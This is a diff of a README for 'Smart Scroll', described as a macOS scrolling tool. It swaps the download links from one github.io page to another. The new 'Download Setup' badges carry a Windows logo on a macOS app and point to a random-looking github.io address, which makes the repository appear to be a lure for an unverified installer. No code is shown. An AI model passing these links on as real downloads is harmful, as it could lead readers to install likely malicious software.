@@ -1,11 +1,7 @@
 # 🖱️ Smart Scroll — Advanced Scrolling Control for macOS
 
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Smart">
-    <strong>⬇️ Download Smart Scroll for macOS</strong>
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://annabellahewzoeyqk.github.io/.github/Smart-Scroll)
 
 ---
 
@@ -89,11 +85,7 @@ Yes, via the menu bar toggle.
 **Is it compatible with both Intel and M1/M2 Macs?**  
 Yes — Smart Scroll runs natively on both architectures.  
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Smart">
-    <strong>⬇️ Download Smart Scroll for macOS</strong>
-  </a>
-</p>
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://annabellahewzoeyqk.github.io/.github/Smart-Scroll)
 
 ---
 
